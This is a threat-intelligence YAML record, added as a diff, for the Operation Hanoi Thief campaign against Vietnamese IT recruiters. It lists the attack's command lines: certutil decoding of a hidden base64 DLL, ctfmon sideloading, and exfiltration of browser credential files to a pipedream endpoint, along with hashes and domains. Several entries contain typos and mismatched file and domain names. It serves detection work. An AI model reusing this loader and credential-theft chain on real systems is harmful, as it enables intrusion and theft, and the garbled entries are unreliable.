@@ -1,0 +1,80 @@
+description: Operation Hanoi Thief targets Vietnamese IT professionals and recruitment
+  teams using fake resumes and LNK files to deliver a DLL implant named LOTUSHARVEST.
+attribution: Chinese-origin threat actor
+malware_families:
+- LOTUSHARVEST
+- MsCtfMonitor
+TTPs:
+  processes:
+  - cmd.exe
+  - ftp.exe
+  - DeviceCredentialDeployment.exe
+  - certutil.exe
+  - ctfmon.exe
+  - powershell.exe
+  commandline:
+  - /c ftp.exe -s:voffsec-certified-professional.png
+  - /c copy offsec-certified-professional.png "C:\\ProgramData\\CV-Nguyen-Van-A.pdf"
+  - /c explorer.exe C:\\ProgramData\\CV-Nguyen-Van-A.pdf
+  - findstr /R "TVQQAAMAAAAEAAAA//BAAL" "offsec-certified-professional.png" >"C:\\ProgramData\\b64.tmp"
+  - findstr /v /C:"findstr /R" "C:\\ProgramData\\be4.tmp" > "Stemp%\\b64.tmp"
+  - move /Y %temp%\\b64.tmp "C:\\ProgramData\\be4.tmp">nul
+  - certutil -decode C:\\ProgramData\\b64.tmp C:\\ProgramData\\MsCtfMonitor.dll
+  - /c copy "C:\\Windows\\System32\\ctfmon.exe" "C:\\ProgramData\\ctfmon.exe"
+  - /c start C:\\ProgramData\\ctfmon.exe
+  - /c del C:\\ProgramData\\lala.exe
+  - /c del C:\\ProgramData\\b64.tmp
+  powershell: []
+  scripting_engine:
+  - batch
+  registry_keys: []
+  image_load:
+  - MsCtfMonitor.dll
+  network_connections:
+  - ftp.exe -> attacker-controlled server
+  - ctfmon.exe -> eol4hkm8mfoeevs.m.pipedream.net:443
+  - InternetOpenA
+  - eoldhkmgmfoeevs.m.pipedream.net
+  - POST
+  - /service
+  - 'Content-Type: application/json'
+  file_activity:
+  - offsec-certified-professional.png
+  - CV-Nguyen-Van-A.pdf
+  - C:\\ProgramData\\lala.exe
+  - C:\\ProgramData\\b64.tmp
+  - C:\\ProgramData\\MsCtfMonitor.dll
+  - C:\\ProgramData\\ctfmon.exe
+  - C:\\Users\\%username%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login
+    Data
+  - C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\login
+    Data
+  persistence:
+  - DLL sideloading of MsCtfMonitor.dll
+  process_relations: []
+IOCs:
+  hashes:
+  - 1beb8fb1b6283dc7fffedcc2f058836d895d92b2fb2c37d982714af648994fed
+  - 77373ee9869b492de0db2462efd5d3eff910b227e53d238fae16ad011826388a
+  - 693ea9f0837c9e0c0413da6198b6316a6ca6dfd9f4d3db71664d2270a65bcf38
+  - 48e18db10bf9fa0033affaed849f053bd20c59b32b71855d1cc72f613d0cac4b
+  ip_addresses: []
+  domains:
+  - fuuhlswix.requestrepo.com
+  - eol4hkm8mfoeevs.m.pipedream.net
+  - eoldhkmgmfoeevs.m.pipedream.net
+  urls:
+  - https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-9-1-1024x104.png
+  - https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-10-1-1024x411.png
+  - https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-13-1-1024x310.png
+  - https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-14-1.png
+  - https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-16-1-1024x289.png
+  - https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-17-1-1024x226.png
+  - https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-19-1-1024x190.png
+  - https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-20-1-1024x134.png
+  - https://www.seqrite.com/blog/wp-content/uploads/2025/11/image-21-1-1024x316.png
+authors:
+- Priya Patel
+reference: https://www.seqrite.com/blog/operation-hanoi-thief-threat-actor-targets-vietnamese-it-professionals-and-recruitment-teams
+date_of_publication: November 28, 2025
+file_creation_date: December 11, 2025
